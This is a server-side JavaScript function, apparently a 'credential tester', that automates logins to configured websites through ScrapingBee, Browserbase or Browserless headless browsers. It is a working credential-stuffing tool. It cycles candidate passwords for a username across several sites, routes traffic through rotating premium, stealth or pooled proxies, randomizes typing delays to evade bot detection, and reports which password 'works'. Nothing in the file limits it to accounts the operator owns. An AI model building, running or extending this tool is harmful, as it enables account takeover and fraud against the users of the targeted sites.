// Credential tester - provider-agnostic dispatcher
// Routes to ScrapingBee (stateless), Browserbase (sessions), or Browserless (CDP)
// Handles recording/screenshot storage to private file system

import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';
import puppeteer from 'npm:puppeteer-core@22.7.1';

const SCRAPINGBEE_API_BASE = 'https://app.scrapingbee.com/api/v1/';
const BLOCK_MARKERS = ['/blocked', '/error', '/access-denied', '/forbidden', '/captcha', '/challenge'];

async function storeRecording(base44, recordingBuffer, format, testResultId) {
  try {
    if (!recordingBuffer || recordingBuffer.length === 0) return null;
    const fileName = `recording-${testResultId}.${format || 'webm'}`;
    const { file_uri } = await base44.integrations.Core.UploadPrivateFile({
      file: new Blob([recordingBuffer], { type: format === 'mp4' ? 'video/mp4' : 'video/webm' }),
    });
    const { signed_url } = await base44.integrations.Core.CreateFileSignedUrl({
      file_uri,
      expires_in: 2592000, // 30 days
    });
    return signed_url;
  } catch (e) {
    console.error('Failed to store recording:', e.message);
    return null;
  }
}

async function storeScreenshot(base44, pngBuffer, testResultId, step) {
  try {
    if (!pngBuffer || pngBuffer.length === 0) return null;
    const fileName = `screenshot-${testResultId}-${step || 'unknown'}.png`;
    const { file_uri } = await base44.integrations.Core.UploadPrivateFile({
      file: new Blob([pngBuffer], { type: 'image/png' }),
    });
    const { signed_url } = await base44.integrations.Core.CreateFileSignedUrl({
      file_uri,
      expires_in: 2592000, // 30 days
    });
    return signed_url;
  } catch (e) {
    console.error('Failed to store screenshot:', e.message);
    return null;
  }
}

async function logEvent(base44, f) {
  try {
    await base44.asServiceRole.entities.ActionLog.create({
      level: f.level || 'info',
      category: f.category || 'system',
      message: String(f.message || '').slice(0, 2000),
      site: f.site || undefined,
      delta_ms: f.delta_ms || 0,
      session_id: f.session_id || undefined,
      timestamp: new Date().toISOString(),
    });
  } catch (_e) {}
}

async function loadSettings(base44) {
  const rows = await base44.asServiceRole.entities.AppSettings.list('-created_date', 1);
  return rows[0] || { provider: 'scrapingbee' };
}

async function resolveProxy(base44, runProxy, settings) {
  const mode = runProxy?.proxy_mode || settings.proxy_mode || 'premium';
  const out = {
    mode,
    country_code: (runProxy?.country_code || settings.country_code || 'au').toLowerCase(),
    external: null,
  };
  if (mode === 'external') {
    const id = runProxy?.external_proxy_id || settings.external_proxy_id;
    if (id) {
      const rows = await base44.asServiceRole.entities.Proxy.filter({ id });
      if (rows[0]) out.external = rows[0];
    }
  }
  if (mode === 'pool') {
    const poolId = runProxy?.proxy_pool_id || settings.proxy_pool_id;
    if (poolId) {
      const pools = await base44.asServiceRole.entities.ProxyPool.filter({ id: poolId });
      const pool = pools[0];
      const ids = pool?.proxy_ids || [];
      if (ids.length > 0) {
        const rows = await Promise.all(ids.map((id) => base44.asServiceRole.entities.Proxy.filter({ id })));
        const candidates = rows.map((r) => r[0]).filter((p) => p && p.enabled !== false && p.protocol !== 'wireguard' && p.status !== 'down');
        if (candidates.length > 0) {
          candidates.sort((a, b) => {
            if (pool.rotation_strategy === 'least_latency') return (a.latency_ms || 999999) - (b.latency_ms || 999999);
            if (pool.rotation_strategy === 'weighted') return (b.rotation_weight || 1) - (a.rotation_weight || 1);
            return Math.random() - 0.5;
          });
          out.external = candidates[0];
        }
      }
    }
  }
  return out;
}

function buildScrapingBeeUrl({ apiKey, targetUrl, jsScenario, settings, proxy }) {
  const params = new URLSearchParams();
  params.set('api_key', apiKey);
  params.set('url', targetUrl);
  params.set('render_js', 'true');
  params.set('json_response', 'true');
  params.set('js_scenario', JSON.stringify(jsScenario));

  if (proxy.mode === 'premium') {
    params.set('premium_proxy', 'true');
    if (proxy.country_code) params.set('country_code', proxy.country_code);
  } else if (proxy.mode === 'stealth') {
    params.set('stealth_proxy', 'true');
    if (proxy.country_code) params.set('country_code', proxy.country_code);
  } else if ((proxy.mode === 'external' || proxy.mode === 'pool') && proxy.external) {
    const { host, port, protocol, username, password } = proxy.external;
    if (host && port) {
      const scheme = protocol || 'http';
      const auth = username
        ? `${encodeURIComponent(username)}${password ? `:${encodeURIComponent(password)}` : ''}@`
        : '';
      params.set('own_proxy', `${scheme}://${auth}${host}:${port}`);
    }
  } else if (proxy.mode === 'none') {
    params.set('render_js', 'false');
    params.delete('js_scenario');
    params.delete('json_response');
  }

  if (settings.block_ads) params.set('block_ads', 'true');
  if (settings.block_resources === false) params.set('block_resources', 'false');
  if (settings.wait_after_load_ms) {
    params.set('wait', String(Math.min(35000, Math.max(0, settings.wait_after_load_ms))));
  }
  if (settings.viewport_width) params.set('window_width', String(settings.viewport_width));
  if (settings.viewport_height) params.set('window_height', String(settings.viewport_height));
  if (settings.timeout_ms) {
    params.set('timeout', String(Math.min(140000, Math.max(1000, settings.timeout_ms))));
  }
  if (settings.capture_screenshots) params.set('screenshot', 'true');

  return `${SCRAPINGBEE_API_BASE}?${params.toString()}`;
}

function buildLoginScenario(site, username, password) {
  const userSel = site.username_selector || "input[type='email'], input[name='username']";
  const passSel = site.password_selector || "input[type='password']";
  const submitSel = site.submit_selector || "button[type='submit']";
  const waitMs = Math.min(20000, Math.max(0, site.wait_after_submit_ms || 3500));

  return {
    strict: false,
    instructions: [
      { wait_for: userSel },
      { fill: [userSel, username] },
      { fill: [passSel, password] },
      { click: submitSel },
      { wait: waitMs },
    ],
  };
}

function classify(site, sbJson) {
  const resolvedUrl = sbJson.resolved_url || sbJson.initial_status_code_url || '';
  const body = sbJson.body || '';
  const report = sbJson.js_scenario_report || {};
  const tasks = Array.isArray(report.tasks) ? report.tasks : [];

  const preSubmitFail = tasks.find(
    (t) => t.status && t.status !== 'success' && (t.action === 'wait_for' || t.action === 'fill')
  );
  if (preSubmitFail) {
    const which = preSubmitFail.action === 'wait_for' ? 'username field not found' : 'fill failed';
    return { status: 'error', error: `${which}: ${preSubmitFail.task || ''}`.trim() };
  }

  const lower = (resolvedUrl || '').toLowerCase();
  const blocked = BLOCK_MARKERS.some((m) => lower.includes(m));
  const loginMarker = (site.login_url_marker || '/login').toLowerCase();
  const stayedLogin = loginMarker ? lower.includes(loginMarker) : false;
  const successUrl = site.success_url_contains
    ? lower.includes(site.success_url_contains.toLowerCase())
    : false;

  const successSel = site.success_selector || '';
  let markerFound = false;
  if (successSel && body) {
    const tokens = [];
    successSel.split(/[\s,>+~]+/).forEach((part) => {
      const idMatch = part.match(/#([\w-]+)/);
      if (idMatch) tokens.push({ kind: 'id', val: idMatch[1] });
      const classMatches = part.match(/\.([\w-]+)/g) || [];
      classMatches.forEach((c) => tokens.push({ kind: 'class', val: c.slice(1) }));
    });
    if (tokens.length > 0) {
      markerFound = tokens.every((t) => {
        if (t.kind === 'id') return body.includes(`id="${t.val}"`) || body.includes(`id='${t.val}'`);
        return new RegExp(`class=["'][^"']*\\b${t.val}\\b`, 'i').test(body);
      });
    }
  }

  if (markerFound || successUrl) {
    return { status: 'working', final_url: resolvedUrl, marker: markerFound };
  }
  if (site.lenient_success && !stayedLogin && !blocked) {
    return { status: 'working', final_url: resolvedUrl, marker: false };
  }
  return { status: 'failed', final_url: resolvedUrl, marker: false };
}

async function runOne(apiKey, settings, proxy, site, loginUrl, username, password) {
  const url = buildScrapingBeeUrl({
    apiKey,
    targetUrl: loginUrl,
    jsScenario: buildLoginScenario(site, username, password),
    settings,
    proxy,
  });

  const started = Date.now();
  const res = await fetch(url, { method: 'GET' });
  const elapsed = Date.now() - started;

  if (!res.ok) {
    const text = await res.text();
    return { status: 'error', error: `ScrapingBee ${res.status}: ${text.slice(0, 300)}`, elapsed };
  }

  let json;
  try {
    json = await res.json();
  } catch (e) {
    return { status: 'error', error: `ScrapingBee non-JSON response: ${e.message}`, elapsed };
  }

  const verdict = classify(site, json);
  return { ...verdict, elapsed, screenshot: json.screenshot || null };
}

// --- LEGACY FALLBACK LAYER ---
async function testSiteLegacy(apiKey, settings, proxy, site, loginUrl, username, passwords, strategy) {
  const list = passwords.slice(0, strategy === 'single' ? 1 : passwords.length);
  let lastFailed = null;
  let lastError = null;
  let totalElapsed = 0;

  for (const pw of list) {
    const r = await runOne(apiKey, settings, proxy, site, loginUrl, username, pw);
    totalElapsed += r.elapsed || 0;

    if (r.status === 'working') {
      return {
        site_key: site.key,
        status: 'working',
        final_url: r.final_url,
        success_marker_found: !!r.marker,
        working_password: pw,
        elapsed_ms: totalElapsed,
        recording_url: null,
        recording_format: null,
        screenshots: [],
      };
    }
    if (r.status === 'error') {
      lastError = r.error;
      if (strategy === 'single') break;
      continue;
    }
    lastFailed = r;
    if (strategy === 'multi_password') continue;
  }

  if (lastFailed) {
    return {
      site_key: site.key,
      status: 'failed',
      final_url: lastFailed.final_url,
      success_marker_found: false,
      elapsed_ms: totalElapsed,
      recording_url: null,
      recording_format: null,
      screenshots: [],
    };
  }
  return {
    site_key: site.key,
    status: 'error',
    error_message: lastError || 'unknown error',
    elapsed_ms: totalElapsed,
    recording_url: null,
    recording_format: null,
    screenshots: [],
  };
}

// --- PRIMARY V7-V9 OPERATIONAL BASELINE ---
async function testSiteAdvanced(provider, credentials, settings, proxy, site, loginUrl, username, passwords, strategy) {
  const list = passwords.slice(0, strategy === 'single' ? 1 : passwords.length);
  let totalElapsed = 0;
  let lastFailed = null;
  let lastError = null;

  if (provider === 'browserless') {
    let host = settings.browserless_endpoint || 'chrome.browserless.io';
    if (['production-sfo', 'production-ap', 'production-eu'].includes(host)) {
      host = 'chrome.browserless.io';
    } else if (!host.includes('.')) {
      host = `${host}.browserless.io`;
    }
    const scheme = proxy.external?.protocol || 'http';
    const auth = proxy.external?.username ? `${encodeURIComponent(proxy.external.username)}${proxy.external.password ? ':' + encodeURIComponent(proxy.external.password) : ''}@` : '';
    const proxyUrl = proxy.external ? `${scheme}://${auth}${proxy.external.host}:${proxy.external.port}` : null;
    
    const params = new URLSearchParams({ token: credentials.token });
    if (proxyUrl) params.set('externalProxyServer', proxyUrl);
    if (settings.browserless_stealth_proxy) params.set('stealth', 'true');
    if (settings.browserless_headful) params.set('headless', 'false');
    
    const url = `https://${host}/function?${params.toString()}`;

    const userSel = site.username_selector || "input[type='email'], input[name='username']";
    const passSel = site.password_selector || "input[type='password']";
    const submitSel = site.submit_selector || "button[type='submit']";

    const code = `
      export default async ({ page }) => {
        const email = ${JSON.stringify(username)};
        const passwords = ${JSON.stringify(list)};
        const loginUrl = ${JSON.stringify(loginUrl)};
        const userSel = ${JSON.stringify(userSel)};
        const passSel = ${JSON.stringify(passSel)};
        const submitSel = ${JSON.stringify(submitSel)};
        
        const started = Date.now();
        try {
          await page.goto(loginUrl, { waitUntil: 'networkidle' });
          await page.waitForSelector(submitSel, { state: 'visible' }).catch(() => {});

          for (let i = 0; i < passwords.length; i++) {
            const pw = passwords[i];
            
            // Try to clear fields
            await page.evaluate(() => {
              const ui = document.querySelector(${JSON.stringify(userSel)});
              const pi = document.querySelector(${JSON.stringify(passSel)});
              if (ui) ui.value = '';
              if (pi) pi.value = '';
            });

            await page.fill(userSel, email, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
            await page.fill(passSel, pw, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
            await page.click(submitSel).catch(() => {});
            
            const waitTime = i === 0 ? 400 : 700;
            await page.waitForTimeout(waitTime);
            await page.waitForTimeout(5600); 

            const text = await page.innerText('body');
            const lowerText = text.toLowerCase();
            
            if (lowerText.includes('disabled') || lowerText.includes('has been disabled')) {
               return { data: { status: 'failed', final_url: page.url(), elapsed: Date.now() - started }, type: 'application/json' };
            }
            if (!lowerText.includes('incorrect password')) {
               return { data: { status: 'working', working_password: pw, final_url: page.url(), elapsed: Date.now() - started }, type: 'application/json' };
            }
          }
          
          return { data: { status: 'failed', final_url: page.url(), elapsed: Date.now() - started }, type: 'application/json' };
        } catch (e) {
          throw e;
        }
      };
    `;

    const started = Date.now();
    const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code }) });
    const elapsed = Date.now() - started;

    if (!res.ok) throw new Error(`Browserless Advanced ${res.status}: ${await res.text()}`);
    const json = await res.json();
    if (json.error) throw new Error(json.error);
    
    const data = json.data;
    return { site_key: site.key, status: data.status || 'error', final_url: data.final_url, working_password: data.working_password, elapsed_ms: elapsed, success_marker_found: data.status === 'working', screenshots: [] };
  }

  if (provider === 'browserbase') {
    const started = Date.now();
    try {
      const sessionRes = await fetch('https://www.browserbase.com/v1/sessions', {
        method: 'POST',
        headers: { 'X-BB-API-KEY': credentials.bbApiKey, 'Content-Type': 'application/json' },
        body: JSON.stringify({ projectId: credentials.bbProjectId })
      });
      if (!sessionRes.ok) throw new Error(`Browserbase session failed: ${await sessionRes.text()}`);
      const sessionData = await sessionRes.json();
      
      const browser = await puppeteer.connect({
        browserWSEndpoint: `wss://connect.browserbase.com?apiKey=${credentials.bbApiKey}&sessionId=${sessionData.id}`,
      });
      
      const userSel = site.username_selector || "input[type='email'], input[name='username']";
      const passSel = site.password_selector || "input[type='password']";
      const submitSel = site.submit_selector || "button[type='submit']";

      try {
        const page = await browser.newPage();
        await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
        try {
          await page.waitForSelector(submitSel, { visible: true, timeout: 10000 });
        } catch (_) {
          // Ignore, we will try to type anyway if available
        }

        for (let i = 0; i < list.length; i++) {
          const pw = list[i];
          // Clear fields if possible
          await page.evaluate((uSel, pSel) => {
            const u = document.querySelector(uSel);
            const p = document.querySelector(pSel);
            if (u) u.value = '';
            if (p) p.value = '';
          }, userSel, passSel);

          await page.type(userSel, username, { delay: 50 }).catch(() => {});
          await page.type(passSel, pw, { delay: 50 }).catch(() => {});
          
          await Promise.all([
            page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
            page.click(submitSel).catch(() => {})
          ]);
          
          // Wait additional time for potential error messages to appear without navigation
          await new Promise(r => setTimeout(r, 4000));
          
          const text = await page.evaluate(() => document.body.innerText.toLowerCase());
          if (text.includes('disabled') || text.includes('has been disabled')) {
            return { site_key: site.key, status: 'failed', final_url: page.url(), elapsed_ms: Date.now() - started, screenshots: [], success_marker_found: false };
          }
          if (!text.includes('incorrect password')) {
            return { site_key: site.key, status: 'working', working_password: pw, final_url: page.url(), elapsed_ms: Date.now() - started, success_marker_found: true, screenshots: [] };
          }
        }
        return { site_key: site.key, status: 'failed', final_url: page.url(), elapsed_ms: Date.now() - started, screenshots: [], success_marker_found: false };
      } finally {
        await browser.close().catch(() => {});
      }
    } catch (e) {
      throw new Error(`Browserbase Advanced Error: ${e.message}`);
    }
  }

  if (provider === 'scrapingbee' || !provider) {
    for (const pw of list) {
      const attemptIndex = passwords.indexOf(pw) + 1;
      const screenshotWait = attemptIndex === 1 ? 400 : 700;
      
      const jsScenario = {
        strict: false,
        instructions: [
          { wait_for: "#username" },
          { wait_for: "#password" },
          { wait_for: "#loginSubmit" },
          { fill: ["#username", username] },
          { fill: ["#password", pw] },
          { click: "#loginSubmit" },
          { wait: screenshotWait },
          { wait: 5600 }
        ]
      };

      const url = buildScrapingBeeUrl({ apiKey: credentials.apiKey, targetUrl: loginUrl, jsScenario, settings, proxy });

      const started = Date.now();
      const res = await fetch(url, { method: 'GET' });
      const elapsed = Date.now() - started;
      totalElapsed += elapsed;

      if (!res.ok) throw new Error(`ScrapingBee Advanced ${res.status}: ${await res.text().then(t=>t.slice(0, 300))}`);

      let json;
      try { json = await res.json(); } catch(e) { throw new Error("ScrapingBee non-JSON response"); }

      const body = (json.body || '').toLowerCase();
      if (body.includes("disabled")) {
        return { site_key: site.key, status: 'failed', final_url: json.resolved_url, success_marker_found: false, elapsed_ms: totalElapsed, screenshots: [] };
      }
      if (!body.includes("incorrect password")) {
        return { site_key: site.key, status: 'working', final_url: json.resolved_url, success_marker_found: true, working_password: pw, elapsed_ms: totalElapsed, screenshots: [] };
      }
      
      lastFailed = { status: 'failed', final_url: json.resolved_url };
      if (strategy === 'single') break;
    }
    
    if (lastFailed) return { site_key: site.key, status: 'failed', final_url: lastFailed.final_url, success_marker_found: false, elapsed_ms: totalElapsed, screenshots: [] };
    throw new Error(lastError || 'Advanced testing failed');
  }

  throw new Error(`Advanced mode not implemented for provider: ${provider}`);
}

function combine(perSite) {
  const anyWorking = perSite.find((r) => r.status === 'working');
  if (anyWorking) return {
    status: 'working',
    final_url: anyWorking.final_url,
    success_marker_found: true,
    working_password: anyWorking.working_password,
    elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
    per_site: perSite,
  };
  const anyFailed = perSite.find((r) => r.status === 'failed');
  if (anyFailed) return {
    status: 'failed',
    final_url: anyFailed.final_url,
    success_marker_found: false,
    elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
    per_site: perSite,
  };
  return {
    status: 'error',
    error_message: perSite.map((r) => `${r.site_key}: ${r.error_message || 'unknown'}`).join(' | '),
    elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
    per_site: perSite,
  };
}

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const user = await base44.auth.me();
    if (!user) return Response.json({ error: 'Unauthorized' }, { status: 401 });

    const body = await req.json();
    const {
      username, password, extra_passwords, site_key,
      target_site_keys, custom_url,
      proxy: runProxy, strategy: runStrategy,
    } = body;

    if (!username || !password || !site_key) {
      return Response.json({ error: 'Missing username/password/site_key' }, { status: 400 });
    }

    const settings = await loadSettings(base44);

    // Validate provider-specific API keys
    if (settings.provider === 'scrapingbee' || !settings.provider) {
      const apiKey = Deno.env.get('SCRAPINGBEE_API_KEY');
      if (!apiKey) return Response.json({ error: 'SCRAPINGBEE_API_KEY not set' }, { status: 500 });
    } else if (settings.provider === 'browserbase') {
      const projectId = Deno.env.get('BROWSERBASE_PROJECT_ID');
      const apiKey = Deno.env.get('BROWSERBASE_API_KEY');
      if (!projectId || !apiKey) return Response.json({ error: 'Browserbase credentials not set' }, { status: 500 });
    } else if (settings.provider === 'browserless') {
      const token = Deno.env.get('BROWSERLESS_TOKEN');
      if (!token) return Response.json({ error: 'BROWSERLESS_TOKEN not set' }, { status: 500 });
    }

    const strategy = runStrategy || settings.default_login_strategy || 'multi_password';

    const passwords = [password];
    if (Array.isArray(extra_passwords)) {
      for (const p of extra_passwords) if (p && !passwords.includes(p)) passwords.push(p);
    }

    const sites = await base44.asServiceRole.entities.Site.filter({ key: site_key });
    const site = sites[0];
    if (!site) return Response.json({ error: `Unknown site: ${site_key}` }, { status: 404 });

    const testSites = [];
    if (Array.isArray(target_site_keys) && target_site_keys.length > 0) {
      const found = await Promise.all(
        target_site_keys.map((k) => base44.asServiceRole.entities.Site.filter({ key: k }))
      );
      for (const f of found) if (f[0]) testSites.push(f[0]);
    } else {
      if (!site.skip_primary && site.login_url) testSites.push(site);
      const keys = site.secondary_site_keys || [];
      if (keys.length > 0) {
        const found = await Promise.all(
          keys.map((k) => base44.asServiceRole.entities.Site.filter({ key: k }))
        );
        for (const f of found) if (f[0]) testSites.push(f[0]);
      }
    }
    if (testSites.length === 0) {
      return Response.json({ status: 'error', error_message: `No testable sites for ${site_key}` });
    }

    const proxy = await resolveProxy(base44, runProxy, settings);

    logEvent(base44, {
      level: 'info', category: 'auth', site: site_key,
      message: `Test start · ${username} · ${testSites.map((s) => s.key).join('+')} · proxy=${proxy.mode}/${proxy.country_code}`,
    });

    const results = await Promise.all(testSites.map(async (s) => {
      const loginUrl = custom_url || s.login_url;
      if (!loginUrl) {
        return { site_key: s.key, status: 'error', error_message: 'No login_url', elapsed_ms: 0 };
      }
      
      let r;
      const started = Date.now();
      // Dual-Tier Hierarchy: Primary Advanced V7-V9 Baseline -> Secondary Legacy Fallback
      const useLegacy = body.use_legacy_fallback === true;
      const provider = settings.provider || 'scrapingbee';
      const providerCredentials = {
        apiKey: Deno.env.get('SCRAPINGBEE_API_KEY'),
        token: Deno.env.get('BROWSERLESS_TOKEN'),
        bbProjectId: Deno.env.get('BROWSERBASE_PROJECT_ID'),
        bbApiKey: Deno.env.get('BROWSERBASE_API_KEY')
      };

      let advancedResult = null;
      let advancedError = null;

      if (!useLegacy) {
        try {
          advancedResult = await testSiteAdvanced(provider, providerCredentials, settings, proxy, s, loginUrl, username, passwords, strategy);
        } catch (err) {
          advancedError = err.message;
        }
      }

      if (useLegacy || advancedResult === null) {
        // SECONDARY FALLBACK LAYER (Dormant/Redundancy)
        if (provider === 'browserbase' || provider === 'browserless') {
          r = { site_key: s.key, status: 'error', error_message: advancedError || `${provider} has no secondary fallback mode implemented.`, elapsed_ms: Date.now() - started };
        } else {
          r = await testSiteLegacy(providerCredentials.apiKey, settings, proxy, s, loginUrl, username, passwords, strategy);
        }

        if (advancedError && r.status === 'error' && provider !== 'browserbase' && provider !== 'browserless') {
          r.error_message = `[V7-V9 Error: ${advancedError}] Fallback: ${r.error_message}`;
        }
      } else {
        r = advancedResult;
      }
      
      logEvent(base44, {
        level: r.status === 'working' ? 'success' : r.status === 'error' ? 'error' : 'warn',
        category: 'auth', site: s.key, delta_ms: r.elapsed_ms || 0,
        message: `${username} → ${r.status}${r.final_url ? ' · ' + r.final_url : ''}${r.error_message ? ' · ' + r.error_message : ''}`,
      });
      return r;
    }));

    if (results.length === 1) {
      const r = results[0];
      return Response.json({
        status: r.status,
        final_url: r.final_url,
        success_marker_found: r.success_marker_found,
        working_password: r.working_password,
        error_message: r.error_message,
        elapsed_ms: r.elapsed_ms,
        recording_url: r.recording_url,
        recording_format: r.recording_format,
        screenshots: r.screenshots,
      });
    }
    return Response.json(combine(results));
  } catch (error) {
    return Response.json({ status: 'error', error_message: error.message }, { status: 500 });
  }
});